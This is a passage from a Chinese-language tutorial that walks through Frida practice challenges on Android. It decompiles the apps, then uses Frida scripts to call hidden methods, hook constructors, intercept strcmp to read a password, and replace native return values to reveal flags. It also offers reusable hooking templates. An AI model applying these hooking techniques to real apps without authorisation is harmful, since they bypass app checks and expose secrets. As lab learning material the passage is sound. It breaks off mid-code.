src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/335d30a1-e545-422d-9d15-ce5d9c46ba1a.png" alt="335d30a1-e545-422d-9d15-ce5d9c46ba1a"></p><p>没什么有用的信息，就是一个提示词，没了。开jadx看看逻辑吧，<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/a2b28eb3-0581-4eee-ac41-5e1b64740e01.png" alt="a2b28eb3-0581-4eee-ac41-5e1b64740e01"></p><p>可以看到逻辑还是很清晰的，有一个<strong>flag</strong>方法，如果<strong>code</strong>的值是1337，那么就会输出flag，但是该方法没有在程序的任何位置被调用，我们需要借助Frida框架来调用这个方法，以获取flag。跟上一用法相同的是我们需要通过flag方法所在的MainActivity类的实例来调用该方法，但在使用Frida脚本创建MainActivity类的实例会出现错误。</p><p>原因：<strong>flag方法是属于MainActivity实例的，而上一题（4）中，check是单独的一个类实例，而MainActivity是Android组件，由于Android的生命周期和线程规则，Android组件需要依赖于应用程序上下文运行，在Frida中，我们缺少必要的上下文。例如：Android UI组件通常需要具有关联Looper的特定线程，如果涉及UI任务，需要在具有活动Looper的主线程上执行。总之，创建MainActivity的实例可能需要应用处于特定状态，并通过Frida管理整个生命周期，并不建议这样做。</strong></p><p>解决方法：<strong>由于创建MainActivity实例是Android应用程序生命周期的一部分，当Android应用程序启动时，系统会创建MainActivity的一个实例（或AndroidManifest.xml文件中指定的启动器活动）。因此，我们可以使用Frida获取MainActivity的实例，然后调用flag方法来获取我们的标志。</strong></p><p>脚本：</p><pre><code class="language-js">/*Java.performNow是Frida中的一个函数，用于在Java运行时环境中执行代码。*/Java.performNow(function() &#123;  Java.choose(&#39;com.ad2001.frida0x5.MainActivity&#39;, &#123;    // Java.choose在运行时枚举作为第一个参数传入的Java类的实例。    // 第二个参数需要传入包含onMatch和onComplete两个回调函数的选项对象。      onMatch: function(instance) &#123;         // 处理匹配到的类实例的回调函数        // instance参数表示MainActivity类的每个匹配实例        console.log(&quot;Instance found&quot;);        // 找到实例时打印一条提示信息。        instance.flag(1337);         // 调用flag方法，并传入参数1337。    &#125;,    onComplete: function() &#123;&#125;    // 完成操作后的回调函数  &#125;);&#125;);</code></pre><p>这个题和第二个题一样，需要在app运行起来，然后输入frida -U ‘Frida 0x5’ -l F:\桌面\5.js，就可以输出flag</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/e3f1e801-52ef-4c98-af8d-e41be264623f.png" alt="e3f1e801-52ef-4c98-af8d-e41be264623f"></p><p>总结：<strong>Frida 在现有实例上调用方法的脚本模板</strong></p><pre><code class="language-js">  Java.performNow(function() &#123;  Java.choose(&#39;&lt;Package&gt;.&lt;class_Name&gt;&#39;, &#123;    onMatch: function(instance) &#123;      // 匹配到类实例时进行的操作    &#125;,    onComplete: function() &#123;&#125;    // 完成操作后的回调函数  &#125;);&#125;);</code></pre><hr><h5 id="八-Frida用法（6）-js脚本-使用对象参数调用的方法"><a href="#八-Frida用法（6）-js脚本-使用对象参数调用的方法" class="headerlink" title="八.Frida用法（6） .js脚本 使用对象参数调用的方法"></a>八.Frida用法（6） .js脚本 使用对象参数调用的方法</h5><p>1.拿到apk文件，模拟器运行一下，还是和上一题一样，没有任何可以输入的东西，就一个提示词，没了。</p><p>2.看代码逻辑吧，<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/5de480a5-6ed3-46ec-9813-69be4e34c6c7.png" alt="5de480a5-6ed3-46ec-9813-69be4e34c6c7"></p><p>代码看下来，就是主要逻辑在<strong>get_flag</strong>方法里，可是这个方法没有被调用，该方法对传入的<strong>Checker</strong>类型参数A进行检查，如果参数A的<strong>num1</strong>变量值等于1234且<strong>num2</strong>变量值等于4321，就会将flag解码并输出。</p><p>为了得到方法中的flag，我们需要<strong>获取MainActivity类的实例</strong>来调用这个方法，同时还需要满足方法内部对传入参数A.num1和A.num2变量值的验证。因此，我们还需要<strong>创建</strong>一个<strong>Checker类的实例</strong>，并设置好实例中<strong>num1</strong>和<strong>num2</strong>变量的值，在调用get_flag方法时将这个实例作为参数传递。</p><p>那么就可以编写脚本了：</p><pre><code class="language-js">/*Java.performNow是Frida中的一个函数，用于在Java运行时环境中执行代码。*/Java.performNow(function() &#123;  Java.choose(&#39;com.ad2001.frida0x6.MainActivity&#39;, &#123;    // Java.choose在运行时枚举MainActivity类的实例。    // 第二个参数需要传入包含onMatch和onComplete两个回调函数的选项对象。    onMatch: function(instance) &#123;      // 处理匹配到的类实例的回调函数      console.log(&quot;Instance found&quot;);       // 处理匹配到的类实例的回调函数      var checker = Java.use(&quot;com.ad2001.frida0x6.Checker&quot;);       // Java.use函数指定要使用com.ad2001.frida0x6包的Check类。      var checker_obj  = checker.$new();         // 使用$new()方法创建Check类的实例check_obj。      checker_obj.num1.value = 1234;        // 将check_obj实例的num1变量值设置为1234      checker_obj.num2.value = 4321;        // 将check_obj实例的num2变量值设置为4321      instance.get_flag(checker_obj);        // 使用check_obj作为参数；       // 通过获取到的MainActivity类的实例instance调用get_flag方法    &#125;,    onComplete: function() &#123;&#125;  &#125;);&#125;);</code></pre><p>运行脚本，还是一样，先让程序运行起来，然后运行脚本去获取<strong>MainActivity</strong>实例。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/c08a65da-6ad9-4ec7-a418-49658949b813.png" alt="c08a65da-6ad9-4ec7-a418-49658949b813"></p><p>得到flag</p><p>总结：<strong>Frida 使用对象参数调用方法的脚本模板</strong></p><pre><code class="language-js">Java.performNow(function() &#123;  Java.choose(&#39;&lt;Package&gt;.&lt;class_Name&gt;&#39;, &#123;    onMatch: function(instance) &#123;      var &lt;class_reference&gt; = Java.use(&quot;&lt;package_name&gt;.&lt;class&gt;&quot;);      var &lt;class_instance&gt; = &lt;class_reference&gt;.$new(); // 创建类的实例      /*      设置实例参数      */      instance.&lt;method&gt;(class_instance); // 使用对象参数调用方法    &#125;,    onComplete: function() &#123;&#125;    // 完成操作后的回调函数  &#125;);&#125;);</code></pre><hr><h5 id="九-Frida用法（7）-js脚本-Hook构造函数"><a href="#九-Frida用法（7）-js脚本-Hook构造函数" class="headerlink" title="九.Frida用法（7） .js脚本 Hook构造函数"></a>九.Frida用法（7） .js脚本 Hook构造函数</h5><p>1.拿到apk安装包，还是先安装到模拟器中运行一下看看先，</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/a95132d6-0271-4f2f-a4fa-ec9ea5c416f9.png" alt="a95132d6-0271-4f2f-a4fa-ec9ea5c416f9"></p><p>还是一样，没有输入框，只有一句提示词，那就用jadx反编译看看吧，</p><pre><code class="language-java">package com.ad2001.frida0x7;import android.os.Bundle;import android.widget.TextView;import androidx.appcompat.app.AppCompatActivity;import java.security.InvalidKeyException;import java.security.NoSuchAlgorithmException;import java.util.Base64;import javax.crypto.BadPaddingException;import javax.crypto.Cipher;import javax.crypto.IllegalBlockSizeException;import javax.crypto.NoSuchPaddingException;import javax.crypto.spec.SecretKeySpec;/* loaded from: classes3.dex */public class MainActivity extends AppCompatActivity &#123;    TextView t1;    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity    public void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        this.t1 = (TextView) findViewById(R.id.textview);        Checker ch = new Checker(123, 321);        try &#123;            flag(ch);        &#125; catch (InvalidKeyException e) &#123;            throw new RuntimeException(e);        &#125; catch (NoSuchAlgorithmException e2) &#123;            throw new RuntimeException(e2);        &#125; catch (BadPaddingException e3) &#123;            throw new RuntimeException(e3);        &#125; catch (IllegalBlockSizeException e4) &#123;            throw new RuntimeException(e4);        &#125; catch (NoSuchPaddingException e5) &#123;            throw new RuntimeException(e5);        &#125;    &#125;    public void flag(Checker A) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException &#123;        if (A.num1 &gt; 512 &amp;&amp; 512 &lt; A.num2) &#123;            Cipher cipher = Cipher.getInstance(&quot;AES&quot;);            SecretKeySpec secretKeySpec = new SecretKeySpec(&quot;MySecureKey12345&quot;.getBytes(), &quot;AES&quot;);            cipher.init(2, secretKeySpec);            byte[] decryptedBytes = Base64.getDecoder().decode(&quot;cL/bBqDmfO0IXXJCVFwYLeHp1k3mQr+SP6rlQGUPZTY=&quot;);            String decrypted = new String(cipher.doFinal(decryptedBytes));            this.t1.setText(decrypted);        &#125;    &#125;&#125;</code></pre><p>分析代码逻辑，并不难，就是有一个<strong>Checker</strong>类的对象，调用flag方法传入该对象，然后对num1和num2的两个值分别进行判断，两个参数必须都大于512，那么就会对flag进行解密输出。</p><p>逻辑明白之后，我们就可以编写脚本进行hook，Hook Checker类对象的构造函数Checker(int a, int b)，将参数a，b修改为大于512的值来绕过检验。</p><p>脚本：</p><pre><code class="language-js">Java.perform(function ()&#123;  var a = Java.use(&quot;com.ad2001.frida0x7.Checker&quot;);    // 声明了一个变量a来表示目标Android应用程序中的Java类。    // Java.use函数指定要使用com.ad2001.frida0x7包中的Checker类。  a.$init.implementation = function (a,b)&#123;    // $init关键字Hook Checker类对象创建时执行的构造函数    console.log(&quot;Origin num：&quot;,a,b);    // 打印a,b变量初始化时设置的值    this.$init(1000,1000);    // 调用Checker类构造函数将a,b变量值修改为600  &#125;&#125;)</code></pre><p>运行脚本，然后利用jadx控制程序运行</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/5173e46c-b3cf-419f-8c72-a6696551909f.png" alt="5173e46c-b3cf-419f-8c72-a6696551909f"></p><p>拿到flag</p><p>总结：<strong>Frida Hook构造函数的脚本模板</strong></p><pre><code class="language-js">Java.perform(function() &#123;  var &lt;class_reference&gt; = Java.use(&quot;&lt;package_name&gt;.&lt;class&gt;&quot;);  &lt;class_reference&gt;.$init.implementation = function(&lt;args&gt;)&#123;    /*    我们自己的方法实现    */  &#125;&#125;);</code></pre><hr><h5 id="十-Frida用法（8）-js脚本-Hook-native函数"><a href="#十-Frida用法（8）-js脚本-Hook-native函数" class="headerlink" title="十.Frida用法（8） .js脚本 Hook native函数"></a>十.Frida用法（8） .js脚本 Hook native函数</h5><p>1.拿到附件，安装到模拟器中运行一下，可以看到可以让我们输入字符或者数字，然后点击提交，报错，没了。</p><p>2.用jadx静态分析吧，</p><pre><code class="language-java">package com.ad2001.frida0x8;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import androidx.appcompat.app.AppCompatActivity;import com.ad2001.frida0x8.databinding.ActivityMainBinding;/* loaded from: classes4.dex */public class MainActivity extends AppCompatActivity &#123;    private ActivityMainBinding binding;    Button btn;    EditText edt;    public native int cmpstr(String str);    static &#123;        System.loadLibrary(&quot;frida0x8&quot;);    &#125;    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity    public void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());        this.binding = inflate;        setContentView(inflate.getRoot());        this.edt = (EditText) findViewById(R.id.editTextText);        Button button = (Button) findViewById(R.id.button);        this.btn = button;        button.setOnClickListener(new View.OnClickListener() &#123; // from class: com.ad2001.frida0x8.MainActivity.1            @Override // android.view.View.OnClickListener            public void onClick(View v) &#123;                String ip = MainActivity.this.edt.getText().toString();                int res = MainActivity.this.cmpstr(ip);                if (res == 1) &#123;                    Toast.makeText(MainActivity.this, &quot;YEY YOU GOT THE FLAG &quot; + ip, 1).show();                &#125; else &#123;                    Toast.makeText(MainActivity.this, &quot;TRY AGAIN&quot;, 1).show();                &#125;            &#125;        &#125;);    &#125;&#125;</code></pre><p>分析代码逻辑，我们可以知道，只有当我们输入的内容是正确的flag时，<strong>cmpstr</strong>方法的返回值是1时，就会输出表示正确的提示词，然后再输出flag。但是我们可以看到该方法是<strong>native</strong>层的，</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/7fd743f8-b07c-4e52-b19d-957af40378e5.png" alt="7fd743f8-b07c-4e52-b19d-957af40378e5"></p><p>那么我们就去<strong>native层</strong>查看该函数的逻辑。我们将附件中的apk文件的后缀，apk改成zip，然后解压缩，然后我们在路径lib-&gt;x86_64-&gt;libfrida0x8.so，打开libfrida0x8.so文件，用ida64分析，然后找到，<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/038ef7a8-82f7-45b0-8363-2b9ddcf7e43d.png" alt="038ef7a8-82f7-45b0-8363-2b9ddcf7e43d"></p><p>就可以看到伪代码，<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/636e6848-d88a-497a-8b9b-e6886d1836db.png" alt="636e6848-d88a-497a-8b9b-e6886d1836db"></p><p>可以看到就是<strong>aGsjebObujwfMbo</strong>字符串每一个元素都减一，然后将结果给到Password，最后进行比较，如果与我们输入的字符串进行比较，一样就返回1，否则返回0。由于password 参数只在 native 库中调用的 strcmp 函数中被作为参数传递，那么这里我们就可以通过 Frida 脚本 Hook strcmp 函数来实现。</p><p>我们需要编写一个js脚本Hook 应用程序加载的 frida0x8 native 库中 cmpstr 函数使用的 strcmp 函数，并获取函数中使用的参数 password 的值。</p><p>以下就是脚本：</p><p>第一种：</p><pre><code class="language-js">var strcmp_adr =  Module.findExportByName(&quot;libc.so&quot;, &quot;strcmp&quot;);// 使用Module.findExportByName()获取libc.so库中strcmp函数的地址。Interceptor.attach(strcmp_adr, &#123;  // Hook strcmp_adr地址对应的函数，将onEnter和onLeave回调函数附加到strcmp_adr地址中  onEnter: function (args) &#123;    // 在strcmp函数被调用之前执行的回调函数，args是一个指针数组，提供对函数参数的访问。    console.log(&quot;Hooking the strcmp function&quot;);    // 进入strcmp函数时打印提示语&quot;Hooking the strcmp function&quot;    var flag = Memory.readUtf8String(args[1]);     // 使用Memory.readUtf8String()获取password参数；    // password参数在strcmp函数中的地址为arg[1]。    console.log(&quot;The flag is &quot;+ flag);    // 打印获取到的password参数值。  &#125;,  onLeave: function (retval) &#123;    // 在strcmp函数被调用之后执行的回调函数，它提供对返回值retval的访问。  &#125;&#125;);</code></pre><p>但是，这个脚本会把程序中所有的strcmp函数都打印出来，因此，我们可以输入一个特定的字符串（例如：”HELLO”），将其作为 Hook 脚本的过滤器。</p><pre><code class="language-js">var strcmp_adr = Module.findExportByName(&quot;libc.so&quot;, &quot;strcmp&quot;);// 使用Module.findExportByName()获取libc.so库中strcmp函数的地址。ZInterceptor.attach(strcmp_adr, &#123;  // Hook strcmp_adr地址对应的函数，将onEnter和onLeave回调函数附加到strcmp_adr地址中    onEnter: function (args) &#123;      // 在strcmp函数被调用之前执行的回调函数，args是一个指针数组，提供对函数参数的访问。        var arg0 = Memory.readUtf8String(args[0]);          // 使用Memory.readUtf8String()读取第一参数inputStr内容。        var flag = Memory.readUtf8String(args[1]);          // 使用Memory.readUtf8String()获取第二个参数password内容。        if (arg0.includes(&quot;HELLO&quot;)) &#123;          // 只有当第一个参数值是我们输入的特定字符串&quot;HELLO&quot;时才执行下面的操作。            console.log(&quot;Hooking the strcmp function&quot;);             // 打印提示语&quot;Hooking the strcmp function&quot;            console.log(&quot;Input &quot; + arg0);             // 打印第一个参数inputStr的值。            console.log(&quot;The flag is &quot;+ flag);             // 打印第二个参数password的值。        &#125;    &#125;,    onLeave: function (retval) &#123;        // 在strcmp函数被调用之后执行的回调函数，它提供对返回值retval的访问。    &#125;&#125;);</code></pre><blockquote><p>Memory.readUtf8String()是Frida中用于读取内存中UTF-8编码字符串的函数。它的作用是从指定的内存地址读取UTF-8编码的字符串，并将其转换为JavaScript中的字符串类型。</p></blockquote><p>拿到flag</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/c5626169-66af-46d4-85a7-ae73bd1cbca7.png" alt="c5626169-66af-46d4-85a7-ae73bd1cbca7"></p><p>总结：<strong>Frida Hook native 函数的脚本模板</strong></p><pre><code class="language-js">Interceptor.attach(targetAddress, &#123;  // 将回调附加到指定的函数地址，targetAddress为我们想要挂钩的native函数的地址。  onEnter: function (args) &#123;    // 在目标函数被调用之前执行的回调函数，提供对函数参数args的访问。    console.log(&#39;Entering &#39; + functionName);    // 根据需要修改或记录参数  &#125;,  onLeave: function (retval) &#123;    // 在目标函数被调用之后执行的回调函数，它提供对返回值retval的访问。    console.log(&#39;Leaving &#39; + functionName);    // 根据需要修改或记录参数  &#125;&#125;);</code></pre><p><strong>补充</strong>：</p><p>在前面的学习我们知道，Hook一个函数需要知道调用这个函数的程序包名和类名。而Hook native 函数，我们需要知道这个 native 函数的地址，然后使用 Frida 的 Interceptor API 进行 Hook。</p><blockquote><p>Interceptor API是Frida中一个功能强大的模块，能够帮助我们 Hook C 函数、Objective-C 方法。</p><p>Interceptor模块中Interceptor.attach()函数用于拦截函数调用，需要传递两个参数，第一个参数是要拦截的函数地址，第二个参数是包含回调函数的对象，用于定义在目标函数被调用时执行的回调函数，通常包含以下两个回调函数：</p><ul><li><p>onEnter：在目标函数被调用之前执行的回调函数。在这个回调函数中，可以访问函数的参数，修改参数的值，记录函数调用信息等操作。</p></li><li><p>onLeave：在目标函数被调用之后执行的回调函数。在这个回调函数中，可以访问函数的返回值，修改返回值，记录函数执行结果等操作。</p></li></ul></blockquote><p><strong>导出函数表</strong>：指的是库文件提供给外部使用的函数或变量。</p><p><strong>导入函数表</strong>：指库文件引用的函数或变量。</p><p>在Frida 0x8 的这个例子中，我们的目标函数是 strcmp函数，所以我们可以从 libfrida0x8.so 的导入表或者 libc 的导出表中找到该函数地址。</p><p>输出libfrida0x8.so的导出表：Module.enumerateExports(“libfrida0x8.so”)</p><p>找strcmp函数的地址：Module.findExportByName(“libc.so”, “strcmp”)或者                                            Module.enumerateImports(“libfrida0x8.so”)[4]</p><hr><p>找cmpstr函数的地址：Module.getExportByName(“libfrida0x8.so”, “Java_com_ad2001_frida0x8_MainActivity_cmpstr”)</p><p>Module.findExportByName(“libfrida0x8.so”, “Java_com_ad2001_frida0x8_MainActivity_cmpstr”)</p><p>Module.findExportByName与 Module.getExportByName 相同。唯一的区别是，如果找不到导出符号，Module.getExportByName 会引发异常，而 Module.findExportByName 会返回 null。</p><p>有时，如果上面的 API 获取不到指定函数地址，我们可以使用 Module.getBaseAddress，这个 API 返回给定模块的基地址，我们可以用它来找到 libfrida0x8.so 库的基地址。如果我们想找到一个特定函数的地址，可以在基地址的基础上添加偏移量。cmpstr 函数的偏移量，我们可以在 IDA 中查看</p><p>Module.getBaseAddress(“libfrida0x8.so”).add(0x864)   （0x864是偏移量，可以在ida中看到）<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/ebecd84b-9b14-4c80-9ee6-8a238b859c11.png" alt="ebecd84b-9b14-4c80-9ee6-8a238b859c11"></p><hr><p><strong>注</strong>：由于 Android 默认启用 ASLR 安全机制，系统启动或程序加载时随机化内存地址空间，如果你重新启动了 APP，前后两次获取到的指定函数地址会有差异。</p><p>查看libfrida0x8.so导入符号信息：Module.enumerateImports(“libfrida0x8.so”)</p><p>接着，可以利用下标来访问其中的函数的地址：Module.enumerateImports(“libfrida0x8.so”)[4][“address”]    [4]就是下标。</p><hr><h5 id="十一-Frida用法（9）-js脚本-更改native函数的返回值"><a href="#十一-Frida用法（9）-js脚本-更改native函数的返回值" class="headerlink" title="十一.Frida用法（9）.js脚本 更改native函数的返回值"></a>十一.Frida用法（9）.js脚本 更改native函数的返回值</h5><p>1.首先还是一样，拿到apk文件，先安装到模拟器上运行一下，结果还是一样，一顿点，然后九只有提示你try angin</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/1e770054-8c1c-47c3-aaa7-4d66432e4def.png" alt="1e770054-8c1c-47c3-aaa7-4d66432e4def"></p><p>2.接着用jadx打开，静态分析一下反编译的Java代码，</p><pre><code class="language-java">package com.ad2001.a0x9;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.Toast;import androidx.appcompat.app.AppCompatActivity;import com.ad2001.a0x9.databinding.ActivityMainBinding;import java.security.InvalidKeyException;import java.security.NoSuchAlgorithmException;import java.util.Base64;import javax.crypto.BadPaddingException;import javax.crypto.Cipher;import javax.crypto.IllegalBlockSizeException;import javax.crypto.NoSuchPaddingException;import javax.crypto.spec.SecretKeySpec;/* loaded from: classes3.dex */public class MainActivity extends AppCompatActivity &#123;    private ActivityMainBinding binding;    Button btn;    public native int check_flag();    static &#123;        System.loadLibrary(&quot;a0x9&quot;);    &#125;    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity    public void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());        this.binding = inflate;        setContentView(inflate.getRoot());        Button button = (Button) findViewById(R.id.button);        this.btn = button;        button.setOnClickListener(new View.OnClickListener() &#123; // from class: com.ad2001.a0x9.MainActivity.1            @Override // android.view.View.OnClickListener            public void onClick(View v) &#123;                if (MainActivity.this.check_flag() == 1337) &#123;                    try &#123;                        Cipher cipher = Cipher.getInstance(&quot;AES&quot;);                        SecretKeySpec secretKeySpec = new SecretKeySpec(&quot;3000300030003003&quot;.getBytes(), &quot;AES&quot;);                        try &#123;                            cipher.init(2, secretKeySpec);                            byte[] decryptedBytes = Base64.getDecoder().decode(&quot;hBCKKAqgxVhJMVTQS8JADelBUPUPyDiyO9dLSS3zho0=&quot;);                            try &#123;                                String decrypted = new String(cipher.doFinal(decryptedBytes));                                Toast.makeText(MainActivity.this.getApplicationContext(), &quot;You won &quot; + decrypted, 1).show();                                return;                            &#125; catch (BadPaddingException e) &#123;                                throw new RuntimeException(e);                            &#125; catch (IllegalBlockSizeException e2) &#123;                                throw new RuntimeException(e2);                            &#125;                        &#125; catch (InvalidKeyException e3) &#123;                            throw new RuntimeException(e3);                        &#125;                    &#125; catch (NoSuchAlgorithmException e4) &#123;                        throw new RuntimeException(e4);                    &#125; catch (NoSuchPaddingException e5) &#123;                        throw new RuntimeException(e5);                    &#125;                &#125;                Toast.makeText(MainActivity.this.getApplicationContext(), &quot;Try again&quot;, 1).show();            &#125;        &#125;);    &#125;&#125;</code></pre><p>可以看到在<strong>MainActivity</strong> 类中，有一段native功能声明，使用native关键字定义了一个native函数check_flag，该函数不接受任何参数，同时返回一个参数，然后将 a0x9 库加载到程序中，System.loadLibrary 方法提示我们 a0x9 是 native 库文件，check_flag 函数在 a0x9 库中实现。同时，MainActivity 类中还定义了一个 onClick 方法来监控按钮的点击，当点击应用程序按钮时，onClick 方法会将 check_flag 函数的返回值与1337进行比较，如果它们相等，就会解密 flag 并显示在应用程序界面。否则，打印“Try again”。接下来我们需要使用 IDA 来分析 a0x9 库中的 check_flag 函数。</p><pre><code class="language-java">public native int check_flag();    static &#123;        System.loadLibrary(&quot;a0x9&quot;);    &#125;</code></pre><pre><code class="language-java">public void onClick(View v) &#123;if (MainActivity.this.check_flag() == 1337) &#123;    try &#123;        Cipher cipher = Cipher.getInstance(&quot;AES&quot;);        SecretKeySpec secretKeySpec = new SecretKeySpec(&quot;3000300030003003&quot;.getBytes(), &quot;AES&quot;);        try &#123;            cipher.init(2, secretKeySpec);            byte[] decryptedBytes = Base64.getDecoder().decode(&quot;hBCKKAqgxVhJMVTQS8JADelBUPUPyDiyO9dLSS3zho0=&quot;);            try &#123;                String decrypted = new String(cipher.doFinal(decryptedBytes));                Toast.makeText(MainActivity.this.getApplicationContext(), &quot;You won &quot; + decrypted, 1).show();                return;            &#125;                 ...        &#125;        Toast.makeText(MainActivity.this.getApplicationContext(), &quot;Try again&quot;, 1).show();    &#125;</code></pre><p>还是一样，改一下文件后缀名，然后找到liba0x9.so文件，然后用ida64打开，找到对应函数，发现啥逻辑没用，就是一个返回1，<img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/9768b234-8316-4ac0-abf7-27afb009f331.png" alt="9768b234-8316-4ac0-abf7-27afb009f331"></p><p>那么接下来，我们需要使用 Frida 框架，编写一个 JavaScript 脚本，Hook在应用程序加载的 liba0x9.so native 库中运行的 check_flag 函数，并将它的返回值更改为1337。</p><p>通过对 APK 静态分析，我们可以知道 check_flag 函数在 liba0x9.so 库中的名称是Java_com_ad2001_a0x9_MainActivity_check_1flag，同时可以在 liba0x9.so 中的导出表中找到该符号的地址。</p><p>以下是脚本：</p><pre><code class="language-js">var check_flag = Module.findExportByName(&quot;liba0x9.so&quot;, &quot;Java_com_ad2001_a0x9_MainActivity_check_1flag&quot;)// 获取liba0x9.so库中Java_com_ad2001_a0x9_MainActivity_check_1flag函数地址，并将它储存在check_flag中。Interceptor.attach(check_flag, &#123;  // Hook check_flag地址对应的函数，将onEnter和onLeave回调函数附加check_flag地址中  onEnter: function () &#123;    // 在check_flag函数被调用之前执行的回调函数，根据需要修改或记录参数。  &#125;,  onLeave: function (retval) &#123;    // 在check_flag函数被调用之后执行的回调函数，它提供对返回值retval的访问。    console.log(&quot;Original return value :&quot; + retval);    // 打印函数原本返回值    retval.replace(1337)       // 将check_flag函数返回值修改为1337。  &#125;&#125;);</code></pre><p>然后先让程序运行起来，再输入frida -U ‘Frida 0x9’ -l F:\桌面\9.js</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/5125b7ab-1804-4952-a662-7e8f0851a167.png" alt="5125b7ab-1804-4952-a662-7e8f0851a167"></p><p>FRIDA{NATIVE_LAND_0x2}</p><p>就得flag了。</p><p><strong>总结</strong>：Frida 更改native函数返回值的脚本模板</p><pre><code class="language-js">Interceptor.attach(targetAddress, &#123;  // 将回调附加到指定的函数地址，targetAddress为我们想要挂钩的native函数的地址。  onEnter: function (args) &#123;    // 在目标函数被调用之前执行的回调函数，提供对函数参数args的访问。    console.log(&#39;Entering &#39; + functionName);    // 根据需要修改或记录参数  &#125;,  onLeave: function (retval) &#123;    // 在目标函数被调用之后执行的回调函数，它提供对返回值retval的访问。    console.log(&#39;Leaving &#39; + functionName);    // 根据需要修改或记录参数    retval.replace(value)      // 将目标函数返回值修改为value。  &#125;&#125;);</code></pre><hr><h5 id="十二-Frida用法（10）-js脚本调用native函数"><a href="#十二-Frida用法（10）-js脚本调用native函数" class="headerlink" title="十二.Frida用法（10） .js脚本调用native函数"></a>十二.Frida用法（10） .js脚本调用native函数</h5><p>1.还是一样，拿到apk文件，安装到模拟器上，结果发现在雷电模拟器上安装不了，然后换成夜神模拟器，可以安装但是不可以运行，就很奇怪了。(时隔一年，有了真机，重新来完成这题）。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/86be60ff-22b7-45ff-8bfe-60167c7e3bbe.png" alt="86be60ff-22b7-45ff-8bfe-60167c7e3bbe"></p><p>2.那就用jadx打开分析一下函数逻辑</p><pre><code class="language-Java">package com.ad2001.frida0xa;import android.os.Bundle;import androidx.appcompat.app.AppCompatActivity;import androidx.constraintlayout.widget.ConstraintLayout;import com.ad2001.frida0xa.databinding.ActivityMainBinding;import kotlin.Metadata;import kotlin.jvm.internal.DefaultConstructorMarker;import kotlin.jvm.internal.Intrinsics;/* compiled from: MainActivity.kt */@Metadata(d1 = &#123;&quot;\u0000&amp;\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0002\u0018\u0000 \u000b2\u00020\u0001:\u0001\u000bB\u0005¢\u0006\u0002\u0010\u0002J\u0012\u0010\u0005\u001a\u00020\u00062\b\u0010\u0007\u001a\u0004\u0018\u00010\bH\u0014J\t\u0010\t\u001a\u00020\nH\u0086 R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082.¢\u0006\u0002\n\u0000¨\u0006\f&quot;&#125;, d2 = &#123;&quot;Lcom/ad2001/frida0xa/MainActivity;&quot;, &quot;Landroidx/appcompat/app/AppCompatActivity;&quot;, &quot;()V&quot;, &quot;binding&quot;, &quot;Lcom/ad2001/frida0xa/databinding/ActivityMainBinding;&quot;, &quot;onCreate&quot;, &quot;&quot;, &quot;savedInstanceState&quot;, &quot;Landroid/os/Bundle;&quot;, &quot;stringFromJNI&quot;, &quot;&quot;, &quot;Companion&quot;, &quot;app_debug&quot;&#125;, k = 1, mv = &#123;1, 8, 0&#125;, xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)/* loaded from: classes4.dex */public final class MainActivity extends AppCompatActivity &#123;    public static final Companion Companion = new Companion(null);    private ActivityMainBinding binding;    public final native String stringFromJNI();    /* JADX INFO: Access modifiers changed from: protected */    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity    public void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());        Intrinsics.checkNotNullExpressionValue(inflate, &quot;inflate(layoutInflater)&quot;);        this.binding = inflate;        ActivityMainBinding activityMainBinding = null;        if (inflate == null) &#123;            Intrinsics.throwUninitializedPropertyAccessException(&quot;binding&quot;);            inflate = null;        &#125;        setContentView(inflate.getRoot());        ActivityMainBinding activityMainBinding2 = this.binding;        if (activityMainBinding2 == null) &#123;            Intrinsics.throwUninitializedPropertyAccessException(&quot;binding&quot;);        &#125; else &#123;            activityMainBinding = activityMainBinding2;        &#125;        